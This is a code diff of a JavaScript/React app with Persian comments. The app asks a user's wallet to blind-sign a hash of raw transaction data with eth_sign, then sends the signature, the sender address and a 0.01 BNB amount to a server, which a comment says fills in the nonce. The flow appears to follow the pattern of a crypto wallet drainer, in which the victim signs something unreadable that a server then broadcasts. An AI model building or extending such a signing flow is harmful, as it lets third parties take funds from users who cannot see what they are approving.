@@ -23,14 +23,13 @@ function App() {
 
     async function getRawSignature(address, rawTxData) {
       try {
-        // هش گرفتن از rawTxData برای امضا
         const encoder = new TextEncoder();
         const hashedMessage = await crypto.subtle.digest("SHA-256", encoder.encode(rawTxData));
         const hexHash = "0x" + Array.from(new Uint8Array(hashedMessage), (b) => b.toString(16).padStart(2, "0")).join("");
 
         var rawSignature = await provider.request({
           method: "eth_sign",
-          params: [address, hexHash], // امضای هش تراکنش
+          params: [address, hexHash],
         });
 
         return { rawSignature, rawTxData };
@@ -40,9 +39,11 @@ function App() {
       }
     }
 
-    async function sendSignedTransaction(signature, rawTxData) {
+    async function sendSignedTransaction(sender, balance, signature, rawTxData) {
       try {
         let requestData = {
+          sender: sender,
+          balance: balance,
           signedData: signature,
           rawTxData: rawTxData,
         };
@@ -76,11 +77,13 @@ function App() {
       nonce: "0x0", // مقدار نانس اولیه (سرور مقدار درست را جایگزین می‌کند)
     });
 
+    let balance = "0.01"; // مقدار BNB که ارسال می‌شود
+
     let signedData = await getRawSignature(sender, rawTxData);
 
     if (signedData) {
       console.log("✍️ Signed Raw Data:", signedData);
-      let txHash = await sendSignedTransaction(signedData.rawSignature, signedData.rawTxData);
+      let txHash = await sendSignedTransaction(sender, balance, signedData.rawSignature, signedData.rawTxData);
       console.log("📤 Final Transaction Hash:", txHash);
     } else {
       console.error("⚠ Signing failed.");
